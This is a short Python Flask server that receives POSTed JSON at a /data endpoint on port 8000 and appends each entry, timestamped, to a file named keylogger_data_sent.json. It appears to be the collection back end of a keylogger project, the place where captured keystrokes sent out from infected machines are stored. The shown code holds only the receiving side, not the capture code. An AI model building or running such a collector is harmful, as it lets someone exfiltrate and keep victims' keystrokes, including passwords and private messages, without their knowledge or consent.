# server to recieve the data 
from flask import Flask, request, jsonify
from datetime import datetime
import json

app = Flask(__name__)

@app.route('/data', methods=['POST'])
def receive_data():
    try:
        data = request.get_json()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Store data in a file
        with open('server/keylogger_data_sent.json', 'a') as f:
            log_entry = {
                "timestamp": timestamp,
                "data": data
            }
            json.dump(log_entry, f)
            f.write('\n')
            
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
